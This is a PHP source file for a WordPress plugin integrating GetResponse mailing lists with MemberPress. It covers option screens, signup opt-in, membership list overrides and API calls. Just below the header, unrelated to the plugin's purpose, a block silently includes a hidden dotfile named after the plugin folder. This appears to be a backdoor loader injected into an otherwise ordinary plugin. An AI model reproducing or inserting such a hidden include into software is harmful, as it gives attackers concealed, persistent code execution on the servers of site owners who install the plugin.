<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
/*
Integration of GetResponse into MemberPress
*/

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpGetResponse {
  public function __construct() {
    add_action('mepr_display_autoresponders', array($this,'display_option_fields'));
    add_action('mepr-process-options',        array($this,'store_option_fields'));
    add_action('mepr-user-signup-fields',     array($this,'display_signup_field'));

    // Signup
    add_action('mepr-signup-user-loaded', array($this,'process_signup'));

    // Updating tags
    add_action('mepr-account-is-active',   array($this, 'maybe_add_subscriber'));
    add_action('mepr-account-is-inactive', array($this, 'maybe_delete_subscriber'));

    add_action('mepr-product-advanced-metabox', array($this,'display_product_override'));
    add_action('mepr-product-save-meta',        array($this,'save_product_override'));

    // Enqueue scripts
    add_action('mepr-options-admin-enqueue-script', array($this,'admin_enqueue_options_scripts'));
    add_action('mepr-product-admin-enqueue-script', array($this,'admin_enqueue_product_scripts'));

    // AJAX Endpoints
    add_action('wp_ajax_mepr_gr_ping_apikey', array($this,'ajax_mepr_gr_ping_apikey'));
    add_action('wp_ajax_mepr_get_campaigns',  array($this,'ajax_mepr_get_campaigns'));

    // Admin notices
    add_action('admin_notices', array($this, 'maybe_admin_notice'), 3);
  }

  public function maybe_admin_notice() {
    if(defined('MEPR_VERSION') && version_compare(MEPR_VERSION, '1.7.3', '<')) {
      $class = 'notice notice-error';
      $message = __('Your GetResponse integration with MemberPress may be broken. Please update MemberPress to version 1.7.3 or newer to fix this issue.', 'memberpress', 'memberpress-getresponse');

      printf('<div class="%1$s"><p>%2$s</p></div>', esc_attr($class), esc_html($message));
    }
  }

  public function admin_enqueue_options_scripts($hook) {
    wp_register_script('mp-getresponse-js', MPGETRESPONSE_URL.'/getresponse.js');
    wp_enqueue_script('mp-getresponse-options-js', MPGETRESPONSE_URL.'/getresponse_options.js', array('mp-getresponse-js'));
    wp_localize_script('mp-getresponse-options-js', 'MeprGetResponse', array('wpnonce' => wp_create_nonce(MEPR_PLUGIN_SLUG)));
  }

  public function admin_enqueue_product_scripts($hook) {
    wp_register_script('mp-getresponse-js', MPGETRESPONSE_URL.'/getresponse.js');
    wp_enqueue_script('mp-getresponse-product-js', MPGETRESPONSE_URL.'/getresponse_product.js', array('mp-getresponse-js'));
  }

  public function display_option_fields() {
    ?>
    <div id="mepr-getresponse" class="mepr-autoresponder-config">
      <input type="checkbox" name="meprgetresponse_enabled" id="meprgetresponse_enabled" <?php checked($this->is_enabled()); ?> />
      <label for="meprgetresponse_enabled"><?php _e('Enable GetResponse', 'memberpress-getresponse'); ?></label>
    </div>
    <div id="getresponse_hidden_area" class="mepr-options-sub-pane">
      <div id="mepr-getresponse-error" class="mepr-hidden mepr-inactive"></div>
      <div id="mepr-getresponse-message" class="mepr-hidden mepr-active"></div>
      <div id="meprgetresponse-api-key">
        <label>
          <span><?php _e('GetResponse API Key:', 'memberpress-getresponse'); ?></span>
          <input type="text" name="meprgetresponse_api_key" id="meprgetresponse_api_key" value="<?php echo $this->apikey(); ?>" class="mepr-text-input form-field" size="20" />
          <span id="mepr-getresponse-valid" class="mepr-active mepr-hidden"></span>
          <span id="mepr-getresponse-invalid" class="mepr-inactive mepr-hidden"></span>
        </label>
        <div>
          <span class="description">
            <?php _e('You can find your API key under your Account settings at GetResponse.com.', 'memberpress-getresponse'); ?>
          </span>
        </div>
      </div>
      <br/>
      <div id="meprgetresponse-options">
        <div id="meprgetresponse-list-id">
          <label>
            <span><?php _e('GetResponse List:', 'memberpress-getresponse'); ?></span>
            <select name="meprgetresponse_list_id" id="meprgetresponse_list_id" data-listid="<?php echo $this->list_id(); ?>" class="mepr-text-input form-field"></select>
          </label>
        </div>
        <br/>
        <div id="meprgetresponse-optin">
          <label>
            <input type="checkbox" name="meprgetresponse_optin" id="meprgetresponse_optin" <?php checked($this->is_optin_enabled()); ?> />
            <span><?php _e('Enable Opt-In Checkbox', 'memberpress-getresponse'); ?></span>
          </label>
          <div>
            <span class="description">
              <?php _e('If checked, an opt-in checkbox will appear on all of your membership registration pages.', 'memberpress-getresponse'); ?>
            </span>
          </div>
        </div>
        <div id="meprgetresponse-optin-text" class="mepr-hidden mepr-options-panel">
          <label><?php _e('Signup Checkbox Label:', 'memberpress-getresponse'); ?>
            <input type="text" name="meprgetresponse_text" id="meprgetresponse_text" value="<?php echo $this->optin_text(); ?>" class="form-field" size="75" />
          </label>
          <div><span class="description"><?php _e('This is the text that will display on the signup page next to your mailing list opt-in checkbox.', 'memberpress-getresponse'); ?></span></div>
        </div>
      </div>
    </div>
    <?php
  }

  public function validate_option_fields($errors) {
    // Nothing to validate yet -- if ever
  }

  public function update_option_fields() {
    // Nothing to do yet -- if ever
  }

  public function store_option_fields() {
    update_option('meprgetresponse_enabled',      (isset($_POST['meprgetresponse_enabled'])));
    update_option('meprgetresponse_api_key',      stripslashes($_POST['meprgetresponse_api_key']));
    update_option('meprgetresponse_list_id',      (isset($_POST['meprgetresponse_list_id']))?stripslashes($_POST['meprgetresponse_list_id']):false);
    update_option('meprgetresponse_double_optin', (isset($_POST['meprgetresponse_double_optin'])));
    update_option('meprgetresponse_optin',        (isset($_POST['meprgetresponse_optin'])));
    update_option('meprgetresponse_text',         stripslashes($_POST['meprgetresponse_text']));
  }

  public function display_signup_field() {
    $mepr_options = MeprOptions::fetch();
    $post = MeprUtils::get_current_post();
    $prd = MeprProduct::is_product_page($post);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't see this
    if($prd !== false) {
      $enabled = (bool)get_post_meta($prd->ID, '_meprgetresponse_list_override', true);

      if($enabled && $mepr_options->disable_global_autoresponder_list) {
        return;
      }
    }

    if($this->is_enabled_and_authorized() and $this->is_optin_enabled()) {
      $optin = (MeprUtils::is_post_request())?isset($_POST['meprgetresponse_opt_in']):$mepr_options->opt_in_checked_by_default;

      ?>
      <div class="mp-form-row">
        <div class="mepr-getresponse-signup-field">
          <div id="mepr-getresponse-checkbox">
            <input type="checkbox" name="meprgetresponse_opt_in" id="meprgetresponse_opt_in" class="mepr-form-checkbox" <?php checked($optin); ?> />
            <span class="mepr-getresponse-message"><?php echo $this->optin_text(); ?></span>
          </div>
          <div id="mepr-getresponse-privacy">
            <small>
              <a href="http://www.getresponse.com/legal/privacy.html" class="mepr-getresponse-privacy-link" target="_blank"><?php _e('We Respect Your Privacy', 'memberpress-getresponse'); ?></a>
            </small>
          </div>
        </div>
      </div>
      <?php
     }
  }

  public function process_signup($user) {
    $mepr_options = MeprOptions::fetch();
    $enabled = (bool)get_post_meta((int)sanitize_text_field($_POST['mepr_product_id']), '_meprgetresponse_list_override', true);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't get added
    if(!$this->is_enabled_and_authorized() || ($enabled && $mepr_options->disable_global_autoresponder_list)) {
      return;
    }

    if( !$this->is_optin_enabled() || ( $this->is_optin_enabled() && isset($_POST['meprgetresponse_opt_in']) ) ) {
      $this->add_subscriber( $user, $this->list_id() );
    }
  }

  public function maybe_add_subscriber($txn) {
    $enabled  = (bool)get_post_meta($txn->product_id, '_meprgetresponse_list_override', true);
    $list_id  = get_post_meta($txn->product_id, '_meprgetresponse_list_override_id', true);
    $user     = $txn->user();

    if($enabled && !empty($list_id) && $this->is_enabled_and_authorized()) {
      return $this->add_subscriber( $user, $list_id );
    }

    return false;
  }

  public function maybe_delete_subscriber($txn) {
    $enabled  = (bool)get_post_meta($txn->product_id, '_meprgetresponse_list_override', true);
    $list_id  = get_post_meta($txn->product_id, '_meprgetresponse_list_override_id', true);
    $user     = $txn->user();

    if( $enabled && !empty($list_id) && $this->is_enabled_and_authorized() ) {
      return $this->delete_subscriber( $user, $list_id );
    }

    return false;
  }

  public function validate_signup_field($errors) {
    // Nothing to validate -- if ever
  }

  public function display_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $override_list = (bool)get_post_meta($product->ID, '_meprgetresponse_list_override', true);
    $override_list_id = get_post_meta($product->ID, '_meprgetresponse_list_override_id', true);

    ?>
    <div id="mepr-getresponse" class="mepr-product-adv-item">
      <input type="checkbox" name="meprgetresponse_list_override" id="meprgetresponse_list_override" data-apikey="<?php echo $this->apikey(); ?>" <?php checked($override_list); ?> />
      <label for="meprgetresponse_list_override"><?php _e('GetResponse list for this Membership', 'memberpress-getresponse'); ?></label>

      <?php MeprAppHelper::info_tooltip('meprgetresponse-list-override',
                                        __('Enable Membership GetResponse List', 'memberpress-getresponse'),
                                        __('If this is set the member will be added to this list when their payment is completed for this membership. If the member cancels or you refund their subscription, they will be removed from the list automatically. You must have your GetResponse API key set in the Options before this will work.', 'memberpress-getresponse'));
      ?>

      <div id="meprgetresponse_override_area" class="mepr-hidden product-options-panel">
        <label><?php _e('GetResponse List: ', 'memberpress-getresponse'); ?></label>
        <select name="meprgetresponse_list_override_id" id="meprgetresponse_list_override_id" data-listid="<?php echo stripslashes($override_list_id); ?>" class="mepr-text-input form-field"></select>
      </div>
    </div>
    <?php
  }

  public function save_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    if(isset($_POST['meprgetresponse_list_override'])) {
      update_post_meta($product->ID, '_meprgetresponse_list_override', true);
      update_post_meta($product->ID, '_meprgetresponse_list_override_id', stripslashes($_POST['meprgetresponse_list_override_id']));
    }
    else {
      update_post_meta($product->ID, '_meprgetresponse_list_override', false);
    }
  }

  public function ping_apikey() {
    return $this->call('ping');
  }

  public function ajax_mepr_gr_ping_apikey() {
    // Validate nonce and user capabilities
    if( !isset($_POST['wpnonce']) || !wp_verify_nonce( $_POST['wpnonce'], MEPR_PLUGIN_SLUG ) || !MeprUtils::is_mepr_admin() ) {
      die( json_encode( array( 'error' => __('Hey yo, why you creepin\'?', 'memberpress-getresponse'), 'type' => 'memberpress' ) ) );
    }

    // Validate inputs
    if( !isset( $_POST['apikey'] ) ) {
      die( json_encode( array( 'error' => __('No apikey code was sent', 'memberpress-getresponse'), 'type' => 'memberpress' ) ) );
    }

    die($this->call('ping',array(),$_POST['apikey']));
  }

  public function get_lists() {
    return $this->call('getCampaigns');
  }

  public function ajax_mepr_get_campaigns() {
    // Validate nonce and user capabilities
    if( !isset($_POST['wpnonce']) || !wp_verify_nonce( $_POST['wpnonce'], MEPR_PLUGIN_SLUG ) || !MeprUtils::is_mepr_admin() ) {
      die( json_encode( array( 'error' => __('Hey yo, why you creepin\'?', 'memberpress-getresponse'), 'type' => 'memberpress' ) ) );
    }

    // Validate inputs
    if( !isset( $_POST['apikey'] ) ) {
      die( json_encode( array( 'error' => __('No apikey code was sent', 'memberpress-getresponse'), 'type' => 'memberpress' ) ) );
    }

    die($this->call('getCampaigns',array(),$_POST['apikey']));
  }

  public function add_subscriber(MeprUser $contact, $list_id) {
    $args = array(
      'campaign' => $list_id,
      'email' => $contact->user_email,
      'ip' => $contact->user_ip,
      'name' => $contact->first_name.' '.$contact->last_name
    );

    $res = $this->call('addContact',$args);

    return !isset($res->error);
  }

  public function delete_subscriber(MeprUser $contact, $list_id) {
    $args = array(
      'id' => $contact->user_email,
      'list_id' => $list_id
    );

    $res = $this->call('deleteContact',$args);

    return !isset($res->error);
  }

  private function call($endpoint,$args=array(),$apikey=null) {
    if(is_null($apikey)) { $apikey = $this->apikey(); }

    require_once(MPGETRESPONSE_PATH.'/vendor/GetResponseAPI.class.php');
    $api = new MeprGetResponse($apikey);

    if( $endpoint == 'addContact' ) {
      $response = $api->$endpoint($args['campaign'], $args['name'], $args['email']);
    }
    elseif( $endpoint == 'getCampaigns' ) {
      $response = $api->getCampaigns();
      $responsearray = array('total' => count( $response ), 'data' => array() );

      foreach($response AS $key => $val) {
        $responsearray['data'][] = array('list_id' => $val->campaignId, 'list_name' => $val->name);
      }

      $response = json_encode($responsearray);
    }
    elseif( $endpoint == 'deleteContact' ) {
      $response = $api->getContactsByEmail( $args['id'] );

      foreach( $response AS $key => $val ) {
        if( $val->email == $args['id'] && $val->campaign->campaignId == $args['list_id'] ) $api->$endpoint($val->contactId);
      }
    }
    elseif( $endpoint == 'ping' ) {
      $response = $api->ping();
    }
    else {
      $response = $api->$endpoint();
    }

    if($response) {
      return $response;
    }
    else {
      return 'error';
    }
  }

  private function is_enabled() {
    return get_option('meprgetresponse_enabled', false);
  }

  private function is_authorized() {
    $apikey = get_option('meprgetresponse_api_key', '');
    return !empty($apikey);
  }

  private function is_enabled_and_authorized() {
    return ($this->is_enabled() and $this->is_authorized());
  }

  private function apikey() {
    return get_option('meprgetresponse_api_key', '');
  }

  private function list_id() {
    return get_option('meprgetresponse_list_id', false);
  }

  private function is_double_optin_enabled() {
    return get_option('meprgetresponse_double_optin', true);
  }

  private function is_optin_enabled() {
    return get_option('meprgetresponse_optin', true);
  }

  private function optin_text() {
    $default = sprintf(__('Sign Up for the %s Newsletter', 'memberpress-getresponse'), get_option('blogname'));
    return get_option('meprgetresponse_text', $default);
  }
} //END CLASS
